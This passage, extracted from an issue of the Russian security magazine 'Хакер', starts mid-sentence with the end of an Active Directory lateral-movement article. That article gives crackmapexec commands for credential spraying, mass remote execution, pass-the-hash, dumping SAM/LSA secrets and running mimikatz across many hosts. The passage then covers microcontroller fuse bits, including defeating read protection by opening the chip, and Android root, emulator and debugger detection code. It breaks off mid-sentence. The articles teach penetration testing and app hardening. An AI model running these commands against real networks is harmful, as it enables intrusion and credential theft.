записи в одной из перечисленных ниже форм:
 • паролей открытым текстом;
 • NTLM‐хешей;
 • Kerberos‐билетов.

О том, как их использовать сразу на множестве целей, мы поговорим ниже.


Credentials spraying
Само по себе боковое перемещение — это, как правило, мас совое исполне‐
ние кода, то есть запуск одной и той же коман ды на груп пе целей. При этом
оно часто выполняется вслепую, особенно на начальной стадии, когда нет
разведанного пути получения учет ной записи админа.
  Поэтому важно уметь исполнять код разными способа ми не на одной
машине, а сразу на группе целей. Тут лучший, на мой взгляд, инс трумент —
crackmapexec. Эта тулза имеет край не богатый арсенал функций. Она может
быть использована также для брутфорса и много чего еще, что выходит
за рам ки данной статьи.
  Синтаксис для исполь зования локальных учетных записей выглядит сле‐
дующим обра зом:


cme smb ‐d . ‐u username ‐p password targets.txt

Для домен ных:


cme smb ‐d domain ‐u username ‐p password targets.txt

При этом любой аргумент может быть как значением, так и файлом, содер‐
жащим спи сок значений. Перед тем как начать мас сово исполнять код, нужно
определиться, какие учетные записи на какие ПК имеют доступ.
  Для какой‐то конкретной учетки мы можем сделать проверку прав сра зу
на груп пе целей:


cme smb ‐d . ‐u admin ‐p passwd ‐‐shares targets.txt 2>&1 | grep
Pwn3d

Чаще при боковом перемещении имеешь дело не с одной, а с десятками,
а то и c сот нями учетных записей. В новых версиях cme для этого появи лась
возможность про вер ки combo‐сочетаний:


cme smb ‐d domain ‐u users.txt ‐p passwords.txt ‐‐no‐bruteforce
‐‐continue‐on‐success ‐‐shares targets.txt 2>&1 | grep Pwn3d
cme smb ‐d domain ‐u users.txt ‐H hashes.txt ‐‐no‐bruteforce
‐‐continue‐on‐success ‐‐shares targets.txt 2>&1 | grep Pwn3d

Все учетные записи, которые к чему‐то подошли, сохраняются в базе и дос‐
тупны через команду cmedb. Команду мож но исполь зовать с целью получения
информа ции для SMB:


cmedb> proto smb

Список сохранен ных учетных записей:


cmedb> creds

Список хостов, на которые были попытки вхо да:


cmedb> hosts

Сохраненные таким образом учетные записи в дальнейшем можно исполь‐
зовать в cme по ID:


cme smb ‐id 7 ‐‐shares targets.txt


Массовое исполнение кода
В какой‐то момент нам может потребоваться тупо запус кать какую‐то прог‐
рамму на группе целей. И если для точечного запуска команд мы исполь‐
зовали вся кие psexec, то для мас сового прибегнем к cme. Для выполнения
простой команды можно воспользоваться сле дующей директивой:


cme smb ‐d . ‐u admin ‐p s3cr3t ‐x 'ipconfig' targets.txt

Для выполнения командлетов PowerShell:


cme smb ‐d . ‐u admin ‐p s3cr3t ‐X 'Get‐Service' targets.txt

Исполнение команд разными способами:


cme smb ‐‐exec‐method smbexec ‐d . ‐u admin ‐p s3cr3t ‐x ipconfig
targets.txt
cme smb ‐‐exec‐method wmiexec ‐d . ‐u admin ‐p s3cr3t ‐x ipconfig
targets.txt
cme smb ‐‐exec‐method atexec ‐d . ‐u admin ‐p s3cr3t ‐x ipconfig
targets.txt
cme winrm ‐d . ‐u admin ‐p s3cr3t ‐x ipconfig targets.txt
Используем технику Pass‐the‐Hash на группе целей:
cme smb ‐d . ‐u admin ‐H aad3b435b51404eeaad3b435b51404ee:
31d6cfe0d16ae931b73c59d7e0c089c0 ‐x 'ipconfig' targets.txt

Используем технику Pass‐the‐Ticket на группе целей:


KRB5CCNAME=$(pwd)/tgt.ccache cme smb ‐k ‐u admin ‐x 'ipconfig'
targets.txt

Также cme позволяет пол ностью автоматизировать про цесс сбора локаль ных
учетных записей и кеша доменных:


cme smb ‐d . ‐u users.txt ‐H hashes.txt ‐‐no‐bruteforce
‐‐continue‐on‐success ‐‐sam targets.txt
cme smb ‐d . ‐u users.txt ‐H hashes.txt ‐‐no‐bruteforce
‐‐continue‐on‐success ‐‐lsa targets.txt

Эта коман да автомати зирует практичес ки все описанные выше действия —
соберет все, что мож но, используя каждую из учетных записей. Также
crackmapexec имеет дополнительные модули, рас ширяющие его и без того
богатую функциональность. В частности, имеется модуль mimikatz для мас‐
сового извле чения доменных учеток активных сессий:


cme smb ‐M mimikatz ‐id 8 targets.txt

Однако запускать его в реаль ной среде я бы не рекомендовал из‐за высоко‐
го риска обнаружения антивирусом.


ЗАКЛЮЧЕНИЕ
Windows име ет очень много раз ных особенностей, поз воляющих нам «переп‐
рыгивать» с одного хоста на другой. Мно гие из этих трюков, такие как PTH,
вообще говоря, являются уязвимостями, но Microsoft не хочет их закрывать.
Так они переходят в разряд «фич», которые навсегда останутся в нашем
арсенале.
   Как бы абсурдно это ни проз вучало, отказ от Active Directory улучшил бы
защищен ность многих внутренних сетей. На моей практике был показатель‐
ный слу чай, когда за полтора дня была захвачена огромная внутренняя сеть
в 140 тысяч ПК, но в то же время за пять дней не поддалась крошечная ком‐
пания в десять человек, не исполь зующая Active Directory.
  Сложно себе пред ставить сеть компании, которая сдержала бы натиск
всех описан ных приемов. Слишком мно гое может оказаться неочевидным
для адми нис тра торов,  и  тогда  одна ошибка  приводит  к  краху  всей
инфраструктуры.
  В сетях с Active Directory мы име ем экосистему с единым центром — кон‐
троллером домена. И для его компрометации необя затель но атаковать сеть
прямо в лоб. Как правило, к ком промета ции домена приводят не уязвимости
в ПО, а простые недочеты — избыточное количество админских учеток либо
их чрезмерное использование налево и направо, использование одинаковых
паролей локаль ных учетных записей или же просто слабые пароли.
   Рассмотренные методы сос тавляют при мерно 10% угроз внутренней
инфраструктуры и лишь одну десятую обычного арсенала хакера. Ведь
существуют еще уязвимос ти ПО и атаки на ЛВС. Active Directory вместе с Win‐
dows, имея множество неочевидных изъянов в безопас ности, создает
для атакующего крайне удобную среду для прод вижения, в которой каждый
хост находится в доверительных отношениях с соседними узлами сети. После
успешного взлома одно го такого хоста начинается цепная реакция взломов,
которая доходит до админских ПК и серверов, а потом уже и до АСУ ТП
или SWIFT. И чем боль ше сеть, тем слож нее соб людать порядок, тем больше
вероятность встретить misconﬁguration и тем выше будет цена такой ошибки.
GEEK
БИТЫ
ЗАЩИТЫ





                                            Поляк
                                            Электроника. Коты. Аниме.
                                            vova.mischenko@icloud.com
    РАЗБИРАЕМ СПОСОБЫ ЗАЩИТЫ
       МИКРОКОНТРОЛЛЕРОВ





Если ты занимался микроконтрол лерами, то, конеч но, слы‐
шал о  битах конфигурации. Для разных семейств они
называ ются по‐разному: в AVR это фьюзы, а в PIC — кон‐
фигура цион ное сло во. Сегодня мы разберемся с ними
поподробнее, а еще рассмотрим их применение для защиты
прошивки в контрол лере. И это не был бы «Хакер», если бы
мы не показали способы обхо да такой защиты. Поехали!


             INFO

                     Рекомендую ознакомиться с моей прош лой стать‐
                      ей, в которой более под робно описаны микрокон‐
                        троллеры, о которых говорится ниже.



AVR
В семей стве AVR для настройки применяются фьюзы. Фьюзы (от англ. fuse —
предохранитель) — это особые биты в микроконтроллере, которые, как и все
биты, хра нят информацию. Их основные особенности следующие:
 • они хра нят ся и прошиваются отдельно от осталь ной памяти;
 • изменяются только извне;
 • управляют работой микрокон троллера на самом низком уровне.

Лучше всего их мож но объ яснить на примере дозиметра РКСБ‐104.





                     Дозиметр РКСБ‐104

Основная настройка его выполнялась одним переключателем на перед ней
панели. А вот более тонкие настрой ки требовали снять защитную крышку
с задней стенки и воспользоваться маленькими переключателями (белые
посередине).





                 Задняя панель со снятой крыш кой

В AVR эти биты для удобства соединяют ся в байты: старший, младший,
защитный и дополнитель ный. К каждому биту можно получить дос туп по прин‐
ципу байт → бит. Младший байт обычно отве чает за так тирование, а стар‐
ший — за плюшки. Биты отличаются от чипа к чипу, поэтому с каждым чипом
в идеале стоит разбираться отдельно с помощью документации.
  Значение битов в этом семействе инвертировано: 1 зна чит, что бит стерт,
а 0 — что установлен. Но вот программы для прошивки МК работают по‐раз‐
ному. Для разных программ нужно уточнять логику работы с фьюзами.
   Что могут фьюзы в этом семействе МК:
 • управление тактированием (частота генератора, внешний или внутренний
   генера тор);
 • разрешение на чтение прошив ки мик роконтроллера (самое интересное,
   но об этом поз же);
 • управление таймерами;
 • защита EEPROM;
 • более специфичные функции, их надо уточнять к конкретному чипу.

Самые «популяр ные» биты:
 • CKSEL — их четыре, и они отве чают за тактирование;
 • SUT — их два, и они управляют режимом запуска тактирования;
 • CKOPT — конфигурирует внутренний генератор;
 • RSTDISBL — режим работы ножки RESET МК;
 • SPIEN — разрешение SPI;
 • EESAVE — защита EEPROM;
 • BOOTRST — адрес, откуда начать исполнять код;
 • BODEN — контроль питания;
 • SELFPRGEN — разрешение записи в память изнутри;
 • OCDEN — вот он, бит, разрешающий чтение прошивки.

Считывают фьюзы обычно не вруч ную, а с помощью специальных калькулято‐
ров. Вот один из них — Fusecalc.


Софт
           WARNING

                    При работе с фьюзами будь предельно внимате‐
                         лен. Неправиль но выставленный бит может прев‐
                        ратить чип в «кирпич». Перед прошивкой уточняй
                        логику работы с фьюза ми в твоей прог рамме.



Linux
Я обычно работал с программой avrdude. Приведу пару команд без допол‐
нительных параметров (чип, программатор). Считывание прошивки из чипа
в файл:


$ avrdude ‐U flash:r:flash_dump.hex:i

Считывание энер гонезависимой памяти в файл:


$ avrdude ‐U eeprom:r:eeprom_dump.raw:r

Запись про шивки из файла в чип:


$ avrdude ‐U flash:w:flash_dump.hex

Запись энер гонезависимой памяти из файла:


$ avrdude ‐U eeprom:w:eeprom_dump.raw

Запись фьюзов (0xc3 ‐> lfuse; 0x99 ‐> hfuse):


$ avrdude ‐U lfuse:w:0xc3:m ‐U hfuse:w:0x99:m

Чтение фьюзов в файлы:


$ avrdude ‐U hfuse:r:hfuse.txt:h ‐U lfuse:r:lfuse.txt:h

Есть дополнительные параметры ‐с и ‐p. Первый отвечает за программа тор,
а второй — за чип. В качестве примера — команда для про шивки кон трол‐
лера ATmega328p с помощью USBASP:


$ avrdude ‐U flash:w:flash_dump.hex ‐c usbasp ‐p m328p

В командах есть странные строки вида flash:w:flash_dump.hex. Это стро ки
в специальном фор мате для avrdude. Для чего такое решение — не знаю
ни я, ни кто‐либо еще.
   Части этих строк разделены двоеточиями:
 • первая часть — область памяти в МК (например, flash или lfuse );
 • вторая — направле ние (w — write или r — read);
 • третья — файл на локальном устройстве (например, файл с прошивкой);
 • последняя (опциональная) — формат файла (например, r — raw или i —
    ihex, интелов ский шестнад цатеричный).

Более специфичные случаи применения этой строки выходят за рамки дан‐
ной статьи.


Windows
Оконщики обычно пользуются программами с GUI. Например, AvrDude GUI.





Первая вкладка предназначена для загрузки прошивки. Мы видим и можем
выбрать целевое устройство, фор мат файлов прошивки и пути к самим фай‐
лам. Один предназначен для программы, другой — для энергонезависи мой
памяти.





Вторая вкладка кон фигурирует программа тор: какая используется модель
и на каком порте она сидит.





Вкладка управле ния защитными битами.





А вот наконец и фьюзы. Задаются они как байты.
   Как видишь, все просто, и использовать фьюзы можно, даже не открывая
терминал!


             INFO

                     На   Arduino  можно   конфигурировать   МК,
                      не задумы ваясь о работе фьюзов. Этим занима‐
                        ется Arduino IDE в автоматическом режиме.





                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ

      БИТЫ ЗАЩИТЫ
                   РАЗБИРАЕМ СПОСОБЫ ЗАЩИТЫ
                         МИКРОКОНТРОЛЛЕРОВ





STM
В семействе STM для задания конфигурации используются биты в специаль‐
ных регис трах. Информацию об  этих регистрах и их назначении ищи
в документации. Менять значения этих регистров можно и нужно на ходу, но,
в отличие от AVR, конфигурируется тут не только самое низкоуровневое (так‐
тирование, например), но и всякая мелкая периферия.
  Настраивать надо много, даже если проект в духе Hello world, поэтому
обычно это делается не ручной записью регистров, а с помощью красивого
и мощного софта.


Софт
STM32CubeMX — это офи циальное и бесплатное программное обеспечение,
созданное в компании STMicroelectronics. У нее есть и другая и тоже бесплат‐
ная IDE для своих МК — Atollic TrueSTUDIO. Но нач нем мы с «Кубика».





                         CubeMX

Разобраться с ним просто: соз даешь проект, выбираешь кон троллер – и пог‐
нали. Пор ты настраивают ся прямо на интерактивной кар тинке, а перифе‐
рия — с помощью меню слева. Большинство опций подписано: не надо боль‐
ше лазить в даташит и разбираться с битами регистров. А в конце нажимаешь
соответствующую кнопку — и прог рамма генерирует код на языке прог‐
раммирова ния в виде подключаемого фай ла.





Atollic TrueSTUDIO — это еще одна наворочен ная IDE для микроконтроллеров
STM. В ней можно и код писать, и отлаживать. А еще она хорошо стыкуется
с «Кубом».


        WWW

                        Есть еще System Workbench for STM32 и, конеч‐
                          но, Arduino IDE с ее неисчислимыми модулями.



Посторонним вход запрещен!
Если ты не хочешь использовать софт производителя МК, можно все сделать
руками. Благо это отно сительно нетрудно. Приведу пример кода из одного
своего проекта.


void init_uart()
{
  UART1_CR2 |= UART_CR2_TEN; // Transmitter enable
  UART1_CR2 |= UART_CR2_REN;
  UART1_CR2 |= UART_CR2_RIEN;
  UART1_CR3 &= ~(UART_CR3_STOP1 | UART_CR3_STOP2);
  UART1_BRR2 = (F_CPU/UART_BAUD) & 0x000F;
  UART1_BRR2 |= (F_CPU/UART_BAUD) >> 12;
  UART1_BRR1 = ((F_CPU/UART_BAUD) >> 4) & 0x00FF;
}

Эта функция отвечает за конфигурацию UART. Как видишь, можно обойтись
и без вся ких кубов (хотя на самом деле CubeMX на мой ноут просто не уста‐
новился из‐за слабых характеристик).


Библиотеки
Прошивки для STM, как правило, пишутся с помощью специальных биб‐
лиотек. Есть как офи циальные, так и кастомные (HAL и SPL). Проще говоря,
это стандартный набор библиотек. Можно, конечно, и без них — мне так даже
больше нравится: луч ше понимаешь, как работает твой код.
  Приведу коман ды для компиляции и про шив ки STM8 из упомянутого про‐
екта.


$ sdcc ‐‐Werror ‐‐std‐sdcc99 ‐mstm8 ‐DSTM8S103 ‐lstm8 ‐mstm8
‐‐out‐fmt‐ihx ../devctrl.c
$ stm8flash ‐c stlinkv2 ‐p stm8s103f3 ‐w devctrl.ihx

Здесь мы видим две программы — stm8ﬂash для прошивки и sdcc для ком‐
пиляции. Может, кому‐то пригодится.
 • stm8flash — это прог рамма c GitHub. По назначению — тот же AvrDude,
   только для STM8. Я использовал три аргумента: с для указания прог‐
  рамматора, в моем случае stlinkv2 (программа тор  ST‐Link, под‐
   робнее — в моей прошлой статье); p для указания целевого чипа (у меня
   это была платка с AliExpess с чипом STM8S103F3); w для направления
   работы (write, записать) и файл с прошивкой.
 • sdcc (small device C compiler) — ком пилятор языка C для «маленьких»
   устройств, то есть для микроконтроллеров. Это аналог GCC, но для МК.
 • --Werror — счи тать все предуп реждения ошибками. Стран но, наверное,
   ведь обычно программисты забива ют на предуп реждения, а тут такое.
  Еще есть stdsdcc99 — это стандарт языка. Я использовал этот,
   потому что он оши бок не выдавал.


           WARNING

                    При  низкоуров невом  прог рамми рова нии  стан‐
                      дарты язы ка С очень существенны и код может
                       прекрасно компилироваться на одном и либо
                      вооб ще не ском пилироваться, либо работать неп‐
                       равиль но на дру гом стандарте. В этом вопросе
                        отталкивайся от учебников, по которым ты учил ся
                       программировать. Как правило, во вступлении
                       написано,  какой  стандарт  будет  рассмотрен
                        в книге.


Остальные аргумен ты, кроме файла кода, — это для какого МК компилиро‐
вать код.


PIC
Тут уже вместо фьюзов использует ся особое конфигурационное слово дли‐
ной два байта. Это слово имеет адрес в памяти, который нужно уточнять
в докумен тации. Там же можно найти струк туру этого слова и наз начение
битов. Кстати, логика битов в этом семействе смешанная. Единица может
значить как и «включено», так и «выключено». Пов торюсь, внимательно читай
документацию.
  Приведу вырезку из документации на чип PIC16F627A.





                  Вырезка из документации

Тут мы видим, например, такие нас тройки:
 • CP — защита ﬂash‐памяти, то есть прошивки;
 • CPD — защита области с дан ными;
 • LVP — низковольтная прошивка.

Работает конфигурационное слово как статическая глобальная переменная
в языке С. Есть участок кода, который при прошив ке записы вается прямо
на область памяти, отвечающей за конфигурацию микроконтроллера. Менять
его на ходу, конечно, нельзя. Работа схожа с AVR‐контроллерами.


Софт
Софт я уже описывал в моей прошлой статье, поэтому покажу лишь особен‐
ности при конфигурировании этих самых контроллеров.





    Изображение взято из этой статьи: https://habr.com/ru/post/321542/

Тут исполь зует ся язык ассемблера, и мы видим строчку __CONFIG 03FF4H.
Возможно, это макрос или что‐то подобное, но нам важен смысл — это чис ло
записывается как конфигура ционное слово и кодиру ет в себе настройки МК,
в комментариях к коду они даже подписаны.
  И вот еще один пример кода. Он уже из статьи на «Хабре» (кстати, нас‐
тоятельно рекомен дую с ней озна комиться).


‐‐ This program assumes a 20 MHz resonator or crystal
‐‐ is connected to pins OSC1 and OSC2.
pragma target clock 20_000_000 ‐‐ oscillator frequency
‐‐ configuration memory settings ( fuses)
pragma target OSC HS ‐‐ HS crystal or resonator
pragma target WDT disabled ‐‐ no watchdog
pragma target LVP disabled ‐‐ no Low Voltage Programming
pragma target MCLR external ‐‐ reset externally

Он написан на язы ке JAL, который был создан специально для программи‐
рования этого семейства МК. Этот код явно читабельнее ассем блера. Чего
уж говорить — почти все читабельнее ассемблера! Хотя PIC традици онно
программи руются именно на нем.


        WWW

                        IDE для PIC MPLAB и JAL.




ЗАЩИТА И ВЗЛОМ
Теорию мы разобрали. Теперь поговорим о защите. Как ты понял, у семей‐
ства AVR защитой служит значение фьюза бита. Если защита установлена,
контроллер не даст скачать прошивку. А если сбросить биты защиты, это же
возможно? Возможно, но и тут тебя ждет небольшая свинья: при сбросе бита
защиты МК чистит всю память.
   Что же, через софт не получилось — пойдем через железо. Электроника
не программирование — тут есть что пощупать. Итак, обратимся к истории:
когда‐то давно существо вали чипы памяти с УФ‐стиранием.





               Чип M27c256B — память с УФ‐стиранием

На корпусе чипа было специальное окошко, которое обыч но чем‐нибудь зак‐
леивалось. Записываешь  данные  при  программи ровании  встроенными
средствами, а вот стираешь с помощью специального устройства, по конс‐
трукции схо жего с лампой для ноготочков.





                     Лампа для коготков

Открываешь окошко, кладешь в прибор микросхе му — и через некоторое
время забираешь чистый чип. С лампой‐то все понят но — можно у жены
одолжить. Глав ное, чтобы не заметила, а то потом не объяснишь, что тебе
лампа нуж на через окошко память стирать.
  А вот с окошком что делать? На современных чипах его нет. Если дыр ки
нет — надо ее сделать! Я знаю три метода: механический, химический
и лазерный.
 1. При механическом методе, как выразился польский блогер, szliﬁerka pre‐
   cyzyjna — прецизионной шлифмашинкой, то есть дремелем, надо твер‐
   досплавной насад кой прогрызть дыроч ку в корпусе.
 2. При химичес ком методе применяется смесь кислот (царская водка, если я
   не ошибаюсь), и ей протравли вается все то же отверстие. Но раздобыть
   азотную кислоту проб лематич но: ее оборот под кон тро лем, поскольку она
   используется при производстве взрывоопасных веществ, так что придет ся
   поискать другой спо соб. Если, конечно, у тебя не завалялась баночка
   азотной кислоты.
 3. Пос ледний метод использует лазер. Им прос то прожига ется окошко.
   Лазер можно найти на ЧПУ‐граверах, но хватит ли их мощности — я
   не знаю.

Короче, будем считать, что окошко к подложке чипа ты проделал.





                   Получится что‐то похожее

Дальше нужно понять, где область, которую надо защитить, а где — которую
стереть. По сути, нам надо облучить все, кроме Flash и EEPROM. Определять,
где что, тебе придется интуитивно. Можно посмотреть каналы Lisin YT и Curi‐
ousMarc — там есть вскрытие и изучение чипов. Мож но посмотреть на типич‐
ные ошибки и технологию вскрытия чипов.
   Итак, что защитить, мы разобрались, даль ше защищаем чем‐нибудь све‐
торезистивным. Нап ример, святой синей изолентой. Ну а после суем чип
в стиратель и ждем немного.


             INFO

                      Если что, про лампу для ногтей — это шутка. Нуж‐
                       на лампа с определенной длиной волны и мощ‐
                        ностью.


Все, исхо да два: либо все сделано правильно и аккуратно и защита сня та,
либо что‐то пошло не так и тебе придется искать, что именно.


PIC и STM
У контроллеров PIC все так же, как и у AVR. Условия те же, метод тот же.
   У STM все нес коль ко интереснее. О методах защиты написано в докумен‐
тации. Если вкратце, они не зап рещают считывать чип, а создают условия,
чтобы сделать это было невозможно.
   Но, собирая информа цию для этой статьи, я наткнулся на стра ницу с инте‐
ресным наз ванием — «Считывание защищенной прошивки из флеш‐памяти
STM32F1xx с использованием ChipWhisperer». Смысл это го метода в прог‐
раммной атаке на прошивку. Этот метод бли же к темати ке журнала и дальше
от вашего покор ного слуги, автора статьи.


ВМЕСТО НАПУТСТВИЯ
Прежде чем ты побежишь красть прошивки, предупрежу: даже если ты ее ска‐
чаешь, она будет в виде бинарного кода, который еще надо дизассем бли‐
ровать, изучить и восстановить логику работы, а это ой как неп росто. Поэто‐
му, на мой взгляд, легче взломать компьютер программиста, который писал
прошивку, и ска чать исходники с него. Но это уже тема не моей статьи! :)
ВЗЛОМ


 ЗАЩИЩАЕМ ПРИЛОЖЕНИЕ
 ДЛЯ ANDROID
 ОТ ОТЛАДЧИКОВ,
 ЭМУЛЯТОРОВ И FRIDA

       ЗА
  СЕМЬЮ
 ЗАМКАМИ





Когда задумы ваешь ся о защите приложе‐
ния от ревер са, в первую очередь на ум
приходят  такие  слова,  как  обфускация
и шиф рование.  Но  это  толь ко  часть
решения проблемы. Вторая полови на —          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
это детект и защита от самих инстру ментов              zobnin@glc.ru
реверса:  отладчиков,  эмулято ров,  Frida
и так далее. В этой статье мы рас смотрим
техники, которые мобиль ный софт и злов‐
реды используют, что бы спря таться от этих
инструментов.


           WARNING

                    Не стоит вос принимать приведенную в статье
                    информацию  как рецепт абсолютной защиты.
                        Такого рецепта нет. Мы все го лишь даем себе
                        отсроч ку, затормаживаем исследование, но не
                       делаем его невозможным. Все это — бесконеч ная
                        игра в кошки‐мышки, когда исследователь взла‐
                    мывает очередную защиту, а разработчик при‐
                    думывает ей более изощренную замену.


Важный момент: я приведу мно жес тво разных техник защиты, и у тебя может
возникнуть соблазн запихнуть их все в один класс (или натив ную биб лиотеку)
и с удобством для себя запускать один раз при старте приложения. Так
делать не стоит, механиз мы защиты должны быть раз бро саны по приложению
и стартовать в разное время. Так ты сущес твен но усложнишь жизнь взлом‐
щику, который в противном случае мог бы определить назначение класса/
библиотеки и целиком заменить его одной большой заглушкой.


ROOT
Права root — один из главных инс трументов реверсера. Root позволяет
запускать  Frida без пат чинга приложений, использовать модули Xposed
для изме нения поведения при ложения и трейсинга приложений, менять низ‐
коуровневые параметры системы. В целом наличие root четко говорит о том,
что окружению исполнения доверять нельзя. Но как его обнаружить?
  Самый простой вариант — поискать исполняемый файл su в одном из сис‐
темных катало гов:
 • /sbin/su
 • /system/bin/su
 • /system/bin/failsafe/su
 • /system/xbin/su
 • /system/sd/xbin/su
 • /data/local/su
 • /data/local/xbin/su
 • /data/local/bin/su

Бинарник su всегда присутству ет на рутован ном устройстве, ведь именно
с его помощью при ложения получают права root. Найти его можно с помощью
примитивного кода на Java:


private static boolean findSu() {
    String[] paths = { "/sbin/su", "/system/bin/su", "/system/xbin/
su", "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/xbin/
su", "/system/bin/failsafe/su", "/data/local/su" };
    for (String path : paths) {
        if (new File(path).exists()) return true;
    }
    return false;
}

Либо использовать такую функцию, поза имствованную из приложе ния rootin‐
spector:


jboolean Java_com_example_statfile(JNIEnv * env, jobject this,
jstring filepath) {
    jboolean fileExists = 0;
    jboolean isCopy;
    const char * path = (*env)‐>GetStringUTFChars(env, filepath, &
isCopy);
    struct stat fileattrib;


    if (stat(path, &fileattrib) < 0) {
        __android_log_print(ANDROID_LOG_DEBUG, DEBUG_TAG, "NATIVE:
stat error: [%s]", strerror(errno));
    } else
    {
        __android_log_print(ANDROID_LOG_DEBUG, DEBUG_TAG, "NATIVE:
stat success, access perms: [%d]", fileattrib.st_mode);
        return 1;
    }


    return 0;
}

Еще один вариант — попробовать не просто найти, а запустить бинарник su:


try {
    Runtime.getRuntime().exec("su");
} catch (IOException e) {
    // Телефон не рутован
}

Если его нет, система выдаст IOException. Но здесь нужно быть осторожным:
если устройство все‐таки имеет пра ва root, пользователь увидит на экране
запрос этих самых прав.
  Еще один вариант — найти среди установленных на устройство приложе‐
ний менеджер прав root. Он как раз и отвечает за диалог пре доставления
прав:
 • com.thirdparty.superuser
 • eu.chainﬁre.supersu
 • com.noshufou.android.su
 • com.koushikdutta.superuser
 • com.zachspong.temprootremovejb
 • com.ramdroid.appquarantine
 • com.topjohnwu.magisk

Для поиска мож но использовать такой метод:


private static boolean isPackageInstalled(String packagename, Context
context) {
    PackageManager pm = context.getPackageManager();
    try {
        pm.getPackageInfo(packagename, PackageManager.GET_ACTIVITIES)
;
        return true;
    } catch (NameNotFoundException e) {
        return false;
    }
}

Искать мож но и по кос венным признакам. Например, SuperSU, некогда
популярное решение для получения прав  root, имеет несколько файлов
в файловой системе:
 • /system/etc/init.d/99SuperSUDaemon
 • /system/xbin/daemonsu — SuperSU

Еще один кос венный признак — прошивка, подписанная тестовыми ключами.
Это не всегда подтверждает наличие root, но точно говорит о том, что
на устройстве установлен кастом:


private boolean isTestKeyBuild() {
    String buildTags = android.os.Build.TAGS;
    return buildTags != null && buildTags.contains("test‐keys");
}


MAGISK
Все эти методы детекта root отлично работа ют до тех пор, пока ты не стол‐
кнешься с устройством, рутованным с помощью Magisk. Это так называемый
systemless‐метод рутинга, когда вместо раз мещения компонентов для root‐
доступа в файловой сис теме поверх нее под ключают другую файловую сис‐
тему (овер лей), содержащую эти компоненты.
   Такой механизм работы не только поз воля ет оста вить системный раздел
в целости и сох ранности, но и легко скрывает наличие прав root в сис теме.
Встроенная в Magisk функция MagiskHide просто отключает оверлей для выб‐
ранных приложе ний, делая любые классические способы детекта root бес‐
полезными.





          Процесс скры тия root можно увидеть в логах Magisk

Но есть в MagiskHide один изъян. Дело в том, что, если приложение, которое
находится в списке для скрытия root, запус тит сервис в изолированном про‐
цессе, Magisk также отключит для него оверлей, но в списке подключен ных
файловых систем (/proc/self/mounts) этот оверлей останется. Соответствен‐
но, чтобы обна ружить Magisk, необходимо запус тить сервис в изолированном
процессе и проверить список подклю ченных файловых сис тем.
  Способ был описан в статье Detecting Magisk Hide, а исходный код proof
of concept выложен на GitHub. Способ работает до сих пор на самой пос‐
ледней вер сии Magisk — 20.4.


ЭМУЛЯТОР
Реверсеры часто используют эмулятор для запуска подопытного приложения.
Поэтому  нелишним  будет  внести  в  при ложение  код,  про веряющий,
не запущено ли оно в виртуальной сре де. Сделать это можно, прочитав зна‐
чение некоторых сис темных переменных. Например, стандартный эмулятор
Android Studio устанавливает такие переменные и их значения:


ro.hardware=goldfish
ro.kernel.qemu=1
ro.product.model=sdk

Прочитав их значения, можно предположить, что код исполняется в эмулято‐
ре:


public static boolean checkEmulator() {
    try {
        boolean goldfish = getSystemProperty("ro.hardware").contains(
"goldfish");
        boolean emu = getSystemProperty("ro.kernel.qemu").length() >
0;
        boolean sdk = getSystemProperty("ro.product.model").contains(
"sdk");


        if (emu || goldfish || sdk) {
            return true;
        }
    } catch (Exception e) {}


    return false;
}


private static String getSystemProperty(String name) throws Exception
{
    Class sysProp = Class.forName("android.os.SystemProperties");
    return (String) sysProp.getMethod("get", new Class[]{String.class
}).invoke(sysProp, new Object[]{name});
}

Обрати  вни мание,  что  класс  android.os.SystemProperties  скрытый
и недоступен в SDK, поэтому для обращения к нему мы используем реф‐
лексию.
  В других эмулято рах значения системных переменных могут быть дру гими.
На этой странице есть таб лица со значениями системных перемен ных,
которые могут прямо или косвенно указывать на эмулятор. Там же приведена
таблица значений стека телефонии. Нап ример, серийный номер SIM‐кар‐
ты 89014103211118510720 однознач но указывает на эмулятор. Многие стан‐
дартные зна чения, а также готовые функции для детекта эмулятора можно
найти в этом исходном файле.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
  ЗА СЕМЬЮ ЗАМКАМИ
          ЗАЩИЩАЕМ ПРИЛОЖЕНИЕ ДЛЯ ANDROID
             ОТ ОТЛАДЧИКОВ, ЭМУЛЯТОРОВ И FRIDA





ОТЛАДЧИК
Один из методов ревер са — запуск приложения под управлением отладчика.
Взломщик может деком пилиро вать твое при ложение, затем создать в Android
Studio одноименный проект, закинуть в него полученные исходни ки и запус‐
тить отладку, не компилируя проект. В этом слу чае приложение само покажет
ему свою логику работы.
   Чтобы провер нуть такой финт, взломщику придется пересобрать приложе‐
ние с включенным фла гом отладки (android:debuggable="true"). Поэтому наив‐
ный способ защиты состоит в простой проверке этого флага:


public static boolean checkDebuggable(Context context){
    return (context.getApplicationInfo().flags & ApplicationInfo.
FLAG_DEBUGGABLE) != 0;


}

Чуть более надежный способ — напрямую спросить сис тему, подключен ли
отладчик:


public static boolean detectDebugger() {
    return Debug.isDebuggerConnected();
}

То же самое в нативном коде:


JNIEXPORT jboolean JNICALL
Java_com_test_debugging_DebuggerConnectedJNI(JNIenv * env, jobject
obj) {
    if (gDvm.debuggerConnected || gDvm.debuggerActive) {
        return JNI_TRUE;
    }
    return JNI_FALSE;
}

Приведенные методы помогут обна ружить отладчик на базе протокола JDWP
(как раз тот, что встроен в Android Studio). Но другие отладчики работают
по‐другому, и методы борьбы с ними будут иными. Отладчик GDB, например,
получает контроль над процессом с помощью системного вызова ptrace().
А после использования ptrace флаг TracerPid в синтетическом файле /proc/
self/status изменится с нуля на PID отладчика. Прочитав значение флага,
мы узна ем, под клю чен ли к приложению отладчик GDB:


public static boolean hasTracerPid() throws IOException {
    BufferedReader reader = null;
    try {
        reader = new BufferedReader(new InputStreamReader(new
FileInputStream("/proc/self/status")), 1000);
        String line;


        while ((line = reader.readLine()) != null) {
            if (line.length() > tracerpid.length()) {
                if (line.substring(0, tracerpid.length()).
equalsIgnoreCase(tracerpid)) {
                    if (Integer.decode(line.substring(tracerpid.
length() + 1).trim()) > 0) {
                        return true;
                    }
                    break;
                }
            }
        }


    } catch (Exception exception) {
        e.printStackTrace()
    } finally {
        reader.close();
    }


    return false;
}

Это слегка модифицированная фун кция из репозитория anti‐emulator. Ее ана‐
лог на языке С будет нетрудно найти на Stack Overﬂow.
  Еще один метод борьбы с отладчиками, основанными на ptrace, — поп‐
